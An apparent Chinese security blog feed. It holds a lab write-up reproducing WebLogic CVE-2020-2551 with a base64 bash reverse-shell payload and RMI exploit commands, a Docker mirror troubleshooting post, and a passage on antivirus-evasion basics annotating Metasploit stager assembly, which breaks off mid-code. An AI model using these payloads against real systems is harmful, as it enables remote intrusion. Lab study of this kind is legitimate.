    <content type="html"><![CDATA[<p>手动搭建的weblogic漏洞环境，参考文章：<a href="https://blog.csdn.net/qq_41617034/article/details/118799208">https://blog.csdn.net/qq_41617034/article/details/118799208</a></p><p>一开始使用Ubuntu的NAT环境，但是没有成功，最后按照网上的说法应该是NAT模式不大行，然后使用的是桥接模式了</p><p>Ubuntu-IP：172.16.1.168</p><p>物理机-IP（攻击机）：172.16.1.129</p><h3 id="使用到的工具"><a href="#使用到的工具" class="headerlink" title="使用到的工具"></a>使用到的工具</h3><p>1.exp.java文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>        <span class="hljs-keyword">static</span>&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                        java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNi4xLjEyOS8zMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                        e.printStackTrace();<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>2.marshalsec-0.0.3-SNAPSHOT-all.jar</p><p>3.weblogic_CVE_2020_2551.jar</p><h3 id="使用到的命令"><a href="#使用到的命令" class="headerlink" title="使用到的命令"></a>使用到的命令</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">ncat -lvnp <span class="hljs-number">3333</span><br>javac exp.java -source <span class="hljs-number">1.6</span> -target <span class="hljs-number">1.6</span><br>java -cp marshalsec-<span class="hljs-number">0.0</span>.<span class="hljs-number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://172.16.1.129:8082/#exp&quot;</span> <span class="hljs-number">1099</span><br>python3 -m http.server <span class="hljs-number">8082</span><br>java -jar weblogic_CVE_2020_2551.jar <span class="hljs-number">172.16</span>.<span class="hljs-number">1.168</span> <span class="hljs-number">7001</span> rmi:<span class="hljs-regexp">//</span><span class="hljs-number">172.16</span>.<span class="hljs-number">1.129</span>:<span class="hljs-number">1099</span>/exp<br><span class="hljs-regexp">/bin/</span>bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/172.16.1.129/</span><span class="hljs-number">3333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.攻击机开启nc</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ncat</span> -lvnp <span class="hljs-number">3333</span><br></code></pre></td></tr></table></figure><p><img src="/img/weblogic-2020-2551/image-20250207161801281.png" alt="image-20250207161801281"></p><p>2.编译exp.java文件，生成.class文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">javac</span> exp.java -source <span class="hljs-number">1</span>.<span class="hljs-number">6</span> -target <span class="hljs-number">1</span>.<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>3.在有exp.class文件夹下启一个web服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">8082</span><br></code></pre></td></tr></table></figure><p><img src="/img/weblogic-2020-2551/image-20250207162223192.png" alt="image-20250207162223192"></p><p>4.使用marshalsec起一个恶意的RMI服务</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar marshalsec.jndi.RMIRefServer <span class="hljs-string">&quot;http://172.16.1.129:8082/#exp&quot;</span> <span class="hljs-number">1099</span><br></code></pre></td></tr></table></figure><p>5.使用POC攻击，反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar weblogic_CVE_2020_2551.jar <span class="hljs-number">172.16.1.168</span> <span class="hljs-number">7001</span> rmi://<span class="hljs-number">172.16.1.129:1099</span>/exp<br></code></pre></td></tr></table></figure><p><img src="/img/weblogic-2020-2551/image-20250207170019637.png" alt="image-20250207170019637"></p><p>最后的反弹shell，POC攻击的返回结果依然是“没有回显   自行检测”，但是反弹成功</p><p><img src="/img/weblogic-2020-2551/image-20250207170254075.png" alt="image-20250207170254075"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>weblogic</tag>
      
      <tag>CVE_2020_2551</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker拉取镜像时环境报错</title>
    <link href="/2025/02/06/docker%E6%8B%89%E5%8F%96%E9%95%9C%E5%83%8F%E6%97%B6%E7%8E%AF%E5%A2%83%E6%8A%A5%E9%94%99/"/>
    <url>/2025/02/06/docker%E6%8B%89%E5%8F%96%E9%95%9C%E5%83%8F%E6%97%B6%E7%8E%AF%E5%A2%83%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>报错</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">1.docker: <span class="hljs-built_in">Error</span> response <span class="hljs-keyword">from</span> daemon: <span class="hljs-built_in">Get</span> <span class="hljs-string">&quot;https://registry-1.docker.io/v2/&quot;</span>: net/http: request canceled <span class="hljs-keyword">while</span> waiting <span class="hljs-keyword">for</span><span class="hljs-built_in"> connection </span>(Client.Timeout exceeded <span class="hljs-keyword">while</span> awaiting headers).<br><br>2.<span class="hljs-built_in">Error</span> response <span class="hljs-keyword">from</span> daemon: <span class="hljs-built_in">Get</span> <span class="hljs-string">&quot;https://registry-1.docker.io/v2/&quot;</span>: dial tcp ip: connect:<span class="hljs-built_in"> connection </span>refused<br></code></pre></td></tr></table></figure><h3 id="换源："><a href="#换源：" class="headerlink" title="换源："></a>换源：</h3><p>1.<strong>修改<code>/etc/docker/daemon.json</code>文件</strong>    </p><blockquote><p> vi &#x2F;etc&#x2F;docker&#x2F;daemon.json</p></blockquote><p> 2.<strong>导入镜像</strong></p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>        <span class="hljs-string">&quot;https://docker.registry.cyou&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.chenby.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.actima.top&quot;</span>,<br>        <span class="hljs-string">&quot;https://dockerhub.icu&quot;</span>,<br>        <span class="hljs-string">&quot;https://atomhub.openatom.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://dockerproxy.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.nastool.de&quot;</span>,<br>        <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>,<br>        <span class="hljs-string">&quot;https://hub-mirror.c.163.com&quot;</span>,<br>        <span class="hljs-string">&quot;https://reg-mirror.qiniu.com&quot;</span>      <br>    ]<br>&#125; <br></code></pre></td></tr></table></figure><p>3.<strong>重启</strong></p><blockquote><p>systemctl daemon-reload<br>systemctl restart docker</p></blockquote><p>重启的时候可能会报错</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Job <span class="hljs-keyword">for</span> docker.service failed because <span class="hljs-keyword">the</span> control <span class="hljs-built_in">process</span> exited <span class="hljs-keyword">with</span> error code.<br>See <span class="hljs-string">&quot;systemctl status docker.service&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;journalctl -xeu docker.service&quot;</span> <span class="hljs-keyword">for</span> details.<br></code></pre></td></tr></table></figure><p>输入dockerd命令返回下面的问题，大概率是json文件里面有 制表符（以及其他非法字符）</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">unable <span class="hljs-built_in">to</span> configure <span class="hljs-keyword">the</span> Docker daemon <span class="hljs-keyword">with</span> <span class="hljs-built_in">file</span> /etc/docker/daemon.json: invalid <span class="hljs-keyword">character</span> <span class="hljs-string">&#x27;ã&#x27;</span> looking <span class="hljs-keyword">for</span> beginning <span class="hljs-keyword">of</span> object key <span class="hljs-keyword">string</span><br></code></pre></td></tr></table></figure><h3 id="修改DNS服务配置"><a href="#修改DNS服务配置" class="headerlink" title="修改DNS服务配置"></a>修改DNS服务配置</h3><p>1.<strong>如果DNS服务器出现问题，也可能导致拉取镜像报错。可以通过查看&#x2F;etc&#x2F;resolv.conf文件来检查DNS服务器设置</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>resolv.conf<br></code></pre></td></tr></table></figure><p>2.<strong>如果显示nameserver后面没有IP地址，或者显示的IP地址有问题，可以尝试修改该文件。例如，可以将nameserver 192.168.100.2注释掉，新增nameserver 114.114.114.114和nameserver 8.8.8.8</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment">#nameserver 192.168.100.2</span><br><span class="hljs-attribute">nameserver</span> <span class="hljs-number">114.114.114.114</span><br>nameserver <span class="hljs-number">8.8.8.8</span><br></code></pre></td></tr></table></figure><p>3.应该还有个重启网络服务的操作，但是我的kali重启报错，然后我直接重启的kali，配置也还在（昨天换完源修改完DNS配置以后是可以拉镜像的，但是今天再拉就不成功了，然后就有了下面的内容）</p><h3 id="给docker配置一个代理"><a href="#给docker配置一个代理" class="headerlink" title="给docker配置一个代理"></a>给docker配置一个代理</h3><p>1.<strong>在 &#x2F;etc&#x2F;systemd&#x2F;system 目录下创建 docker.service.d 目录</strong></p><p>sudo mkdir -p &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service.d</p><p>2.<strong>在该目录下创建 http-proxy.conf 文件</strong></p><p>sudo touch &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service.d&#x2F;http-proxy.conf</p><p>3.<strong>编辑该文件并添加下面的内容</strong></p><p>sudo vim &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;docker.service.d&#x2F;http-proxy.conf</p><p>4.<strong>根据自身需要添加下面的内容并替换为实际的配置，一般只需要加 HTTP_PROXY 和 HTTPS_PROXY</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Service]</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTP_PROXY=http://proxy.example.com:8080/&quot;</span><br><span class="hljs-attr">Environment</span>=<span class="hljs-string">&quot;HTTPS_PROXY=http://proxy.example.com:8080/&quot;</span><br></code></pre></td></tr></table></figure><p>kali用的NAT，我配的物理机地址+物理机代理工具局域网http端口10803(172.16.1.129:10803)</p><p>5.<strong>重新启动 Docker&#96;</strong></p><blockquote><p>sudo systemctl daemon-reload<br>sudo systemctl restart docker</p></blockquote><p>成功拉取镜像</p>]]></content>
    
    
    <categories>
      
      <category>docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>免杀基础</title>
    <link href="/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/"/>
    <url>/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><h4 id="1、shellcode是什么"><a href="#1、shellcode是什么" class="headerlink" title="1、shellcode是什么"></a>1、shellcode是什么</h4><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode<strong>机器码</strong>，让电脑可以执行攻击者的任意指令。</p><p>说白了，就是一段16进制字符串，可以直接运行在内存中</p><h4 id="2、shellcode分类"><a href="#2、shellcode分类" class="headerlink" title="2、shellcode分类"></a>2、shellcode分类</h4><h6 id="stage和stageless"><a href="#stage和stageless" class="headerlink" title="stage和stageless"></a>stage和stageless</h6><p>Stage&amp;Stageless. 所谓的<strong>stage</strong>(有阶段)，指的是Beacon会分段的加载shellcode(具体表现为，通过不断的向Listener发起请求，最终获取一个完整的shellcode并执行)，<strong>stageless</strong>(无阶段)，则是在生成时包含完整的shellcode。</p><p>说白了，webshell里的小马和大马</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp stage<br>windows<span class="hljs-regexp">/x64/m</span>eterpreter_reverse_tcp stageless<br></code></pre></td></tr></table></figure><h4 id="3、stage-有阶段-shellcode分析"><a href="#3、stage-有阶段-shellcode分析" class="headerlink" title="3、stage(有阶段)shellcode分析"></a>3、<strong>stage</strong>(有阶段)shellcode分析</h4><p>msf的shellcode源码：</p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/stager/stager_reverse_tcp_nx.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/stager/stager_reverse_tcp_nx.asm</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[BITS 32]<br>[ORG 0]<br><br>  cld                    ; Clear the direction flag. 用于将处理器的方向标志位清零，确保字符串操作的方向是向上增长。<br>  call start             ; Call start, this pushes the address of &#x27;api_call&#x27; onto the stack. 这是一个函数调用，它调用了一个名为start的标签处的代码。<br>%include &quot;./src/block/block_api.asm&quot; 这条指令包含了一个外部文件的内容，这个文件包含了API调用相关的代码。<br>start:                   ;<br>  pop ebp                ; pop off the address of &#x27;api_call&#x27; for calling later. 这里使用pop指令将栈顶的数值弹出并存入寄存器ebp中。<br>%include &quot;./src/block/block_reverse_tcp.asm&quot; <br>  ; By here we will have performed the reverse_tcp connection and EDI will be our socket. 这个指令又包含了另一个外部文件的内容，可能是与反向TCP shell相关的代码。<br>%include &quot;./src/block/block_recv.asm&quot;<br>  ; By now we will have recieved in the second stage into a RWX buffer and be executing it. 这个指令包含了接收数据的代码。<br></code></pre></td></tr></table></figure><h6 id="block-api-asm"><a href="#block-api-asm" class="headerlink" title="block_api.asm"></a>block_api.asm</h6><p>代码中包含了三个文件，先来分析第一个 .&#x2F;src&#x2F;block&#x2F;block_api.asm 文件</p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs assembly">api_call:<br>  pushad                     ; We preserve all the registers for the caller, bar EAX and ECX.<br>  mov ebp, esp               ; Create a new stack frame<br>  xor edx, edx               ; Zero EDX<br>  mov edx, [fs:edx+0x30]     ; Get a pointer to the PEB<br>  mov edx, [edx+0xc]         ; Get PEB-&gt;Ldr<br>  mov edx, [edx+0x14]        ; Get the first module from the InMemoryOrder module list<br>next_mod:                    ;<br>  mov esi, [edx+0x28]        ; Get pointer to modules name (unicode string)<br>  movzx ecx, word [edx+0x26] ; Set ECX to the length we want to check<br>  xor edi, edi               ; Clear EDI which will store the hash of the module name<br>loop_modname:                ;<br>  xor eax, eax               ; Clear EAX<br>  lodsb                      ; Read in the next byte of the name<br>  cmp al, &#x27;a&#x27;                ; Some versions of Windows use lower case module names<br>  jl not_lowercase           ;<br>  sub al, 0x20               ; If so normalise to uppercase<br>not_lowercase:               ;<br>  ror edi, 0xd               ; Rotate right our hash value<br>  add edi, eax               ; Add the next byte of the name<br>  dec ecx<br>  jnz loop_modname           ; Loop until we have read enough<br>  ; We now have the module hash computed<br>  push edx                   ; Save the current position in the module list for later<br>  push edi                   ; Save the current module hash for later<br>  ; Proceed to iterate the export address table,<br>  mov edx, [edx+0x10]        ; Get this modules base address<br>  mov eax, [edx+0x3c]        ; Get PE header<br>  add eax, edx               ; Add the modules base address<br>  mov eax, [eax+0x78]        ; Get export tables RVA<br>  test eax, eax              ; Test if no export address table is present<br>  jz get_next_mod1           ; If no EAT present, process the next module<br>  add eax, edx               ; Add the modules base address<br>  push eax                   ; Save the current modules EAT<br>  mov ecx, [eax+0x18]        ; Get the number of function names<br>  mov ebx, [eax+0x20]        ; Get the rva of the function names<br>  add ebx, edx               ; Add the modules base address<br>  ; Computing the module hash + function hash<br>get_next_func:               ;<br>  test ecx, ecx              ; Changed from jecxz to accomodate the larger offset produced by random jmps below<br>  jz get_next_mod            ; When we reach the start of the EAT (we search backwards), process the next module<br>  dec ecx                    ; Decrement the function name counter<br>  mov esi, [ebx+ecx*4]       ; Get rva of next module name<br>  add esi, edx               ; Add the modules base address<br>  xor edi, edi               ; Clear EDI which will store the hash of the function name<br>  ; And compare it to the one we want<br>loop_funcname:               ;<br>  xor eax, eax               ; Clear EAX<br>  lodsb                      ; Read in the next byte of the ASCII function name<br>  ror edi, 0xd               ; Rotate right our hash value<br>  add edi, eax               ; Add the next byte of the name<br>  cmp al, ah                 ; Compare AL (the next byte from the name) to AH (null)<br>  jne loop_funcname          ; If we have not reached the null terminator, continue<br>  add edi, [ebp-8]           ; Add the current module hash to the function hash<br>  cmp edi, [ebp+0x24]        ; Compare the hash to the one we are searchnig for<br>  jnz get_next_func          ; Go compute the next function hash if we have not found it<br>  ; If found, fix up stack, call the function and then value else compute the next one...<br>  pop eax                    ; Restore the current modules EAT<br>  mov ebx, [eax+0x24]        ; Get the ordinal table rva<br>  add ebx, edx               ; Add the modules base address<br>  mov cx, [ebx+2*ecx]        ; Get the desired functions ordinal<br>  mov ebx, [eax+0x1c]        ; Get the function addresses table rva<br>  add ebx, edx               ; Add the modules base address<br>  mov eax, [ebx+4*ecx]       ; Get the desired functions RVA<br>  add eax, edx               ; Add the modules base address to get the functions actual VA<br>  ; We now fix up the stack and perform the call to the desired function...<br>finish:<br>  mov [esp+0x24], eax        ; Overwrite the old EAX value with the desired api address for the upcoming popad<br>  pop ebx                    ; Clear off the current modules hash<br>  pop ebx                    ; Clear off the current position in the module list<br>  popad                      ; Restore all of the callers registers, bar EAX, ECX and EDX which are clobbered<br>  pop ecx                    ; Pop off the origional return address our caller will have pushed<br>  pop edx                    ; Pop off the hash value our caller will have pushed<br>  push ecx                   ; Push back the correct return value<br>  jmp eax                    ; Jump into the required function<br>  ; We now automagically return to the correct caller...<br>get_next_mod:                ;<br>  pop eax                    ; Pop off the current (now the previous) modules EAT<br>get_next_mod1:               ;<br>  pop edi                    ; Pop off the current (now the previous) modules hash<br>  pop edx                    ; Restore our position in the module list<br>  mov edx, [edx]             ; Get the next module<br>  jmp next_mod               ; Process this module<br></code></pre></td></tr></table></figure><p>主要功能是通过计算的hash值来找到对应 dll 和函数的地址，大概流程如下：</p><ol><li>程序首先通过哈希值比较的方式，在已加载的模块列表中搜索匹配的函数名。它使用一个循环来遍历模块列表，并将函数名与哈希值进行比较，直到找到匹配的函数或遍历完所有模块。</li><li>如果找到了匹配的函数，程序会恢复栈上的数据，并获取目标函数的地址。</li><li>接下来，程序会修正栈上的数据，以便调用目标函数，并跳转到该函数的地址，实现函数调用。</li><li>如果没有找到匹配的函数，或者已经遍历完所有模块，则程序会继续处理下一个模块，直到找到匹配的函数或遍历完所有模块为止。</li></ol><h6 id="block-reverse-tcp-asm"><a href="#block-reverse-tcp-asm" class="headerlink" title="block_reverse_tcp.asm"></a>block_reverse_tcp.asm</h6><p>第二个文件是 .&#x2F;src&#x2F;block&#x2F;block_reverse_tcp.asm 文件</p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs assembly">reverse_tcp:<br>  push 0x00003233        ; Push the bytes &#x27;ws2_32&#x27;,0,0 onto the stack.<br>  push 0x5F327377        ; ...<br>  push esp               ; Push a pointer to the &quot;ws2_32&quot; string on the stack.<br>  push 0x0726774C        ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )<br>  call ebp               ; LoadLibraryA( &quot;ws2_32&quot; )<br>  <br>  mov eax, 0x0190        ; EAX = sizeof( struct WSAData )<br>  sub esp, eax           ; alloc some space for the WSAData structure<br>  push esp               ; push a pointer to this stuct<br>  push eax               ; push the wVersionRequested parameter<br>  push 0x006B8029        ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )<br>  call ebp               ; WSAStartup( 0x0190, &amp;WSAData );<br>  <br>  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.<br>  push eax               ; push null for reserved parameter<br>  push eax               ; we do not specify a WSAPROTOCOL_INFO structure<br>  push eax               ; we do not specify a protocol<br>  inc eax                ;<br>  push eax               ; push SOCK_STREAM<br>  inc eax                ;<br>  push eax               ; push AF_INET<br>  push 0xE0DF0FEA        ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )<br>  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );<br>  xchg edi, eax          ; save the socket for later, don&#x27;t care about the value of eax after this<br><br>set_address:<br>  push byte 0x05         ; retry counter<br>  push 0x0100007F        ; host 127.0.0.1<br>  push 0x5C110002        ; family AF_INET and port 4444<br>  mov esi, esp           ; save pointer to sockaddr struct<br>  <br>try_connect:<br>  push byte 16           ; length of the sockaddr struct<br>  push esi               ; pointer to the sockaddr struct<br>  push edi               ; the socket<br>  push 0x6174A599        ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )<br>  call ebp               ; connect( s, &amp;sockaddr, 16 );<br><br>  test eax,eax           ; non-zero means a failure<br>  jz short connected<br><br>handle_failure:<br>  dec dword [esi+8]<br>  jnz short try_connect<br><br>failure:<br>  push 0x56A2B5F0        ; hardcoded to exitprocess for size<br>  call ebp<br><br>connected:<br></code></pre></td></tr></table></figure><p>这个文件是发起socket连接的，请求连接写好的c2的地址和端口，大概流程是</p><ol><li>加载 ws2_32.dll 库；</li><li>调用 WSAStartup() 初始化 Winsock；</li><li>调用 WSASocketA() 创建一个套接字；</li><li>指定要连接的目标地址和端口号；</li><li>调用 connect() 尝试连接指定的目标；</li><li>如果连接失败，则重试指定次数（这里是 5 次）；</li><li>如果连接成功，则将控制权交给远程主机。</li></ol><h6 id="block-recv-asm"><a href="#block-recv-asm" class="headerlink" title="block_recv.asm"></a>block_recv.asm</h6><p>第三个文件是 .&#x2F;src&#x2F;block&#x2F;block_recv.asm 文件</p><p><a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_recv.sm">https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_recv.sm</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[BITS 32]<br><br>; Compatible: block_bind_tcp, block_reverse_tcp, block_reverse_ipv6_tcp<br><br>; Input: EBP must be the address of &#x27;api_call&#x27;. EDI must be the socket. ESI is a pointer on stack.<br>; Output: None.<br>; Clobbers: EAX, EBX, ESI, (ESP will also be modified)<br><br>recv:<br>  ; Receive the size of the incoming second stage...<br>  push byte 0            ; flags<br>  push byte 4            ; length = sizeof( DWORD );<br>  push esi               ; the 4 byte buffer on the stack to hold the second stage length<br>  push edi               ; the saved socket<br>  push 0x5FC8D902        ; hash( &quot;ws2_32.dll&quot;, &quot;recv&quot; )<br>  